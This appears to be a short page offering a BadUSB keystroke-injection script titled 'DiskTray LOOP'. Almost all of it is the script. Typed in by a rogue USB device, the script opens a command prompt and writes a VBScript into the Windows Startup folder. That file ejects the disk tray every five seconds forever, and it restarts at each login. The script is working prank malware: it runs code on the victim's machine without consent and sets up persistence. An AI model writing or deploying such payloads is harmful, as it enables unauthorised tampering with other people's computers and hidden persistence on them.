# DiskTray LOOP (For BadUSBs)
This scripts sets a vbs file into the startup folder that opens the disk tray over and over (Every 5 seconds).

# Code
<pre><code>GUI d
DELAY 300
GUI r
STRING cmd
ENTER
DELAY 200
STRING cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
ENTER
STRING copy con DT.vbs && start DT.vbs && exit
ENTER
DELAY 100
STRING Set oWMP = CreateObject("WMPlayer.OCX.7" )
ENTER
STRING Set colCDROMs = oWMP.cdromCollection
ENTER
STRING do
ENTER
STRING colCDROMs.Item(i).Eject
ENTER
STRING wscript.sleep 5000
ENTER
STRING loop
DELAY 200
CTRL z
</code></pre>
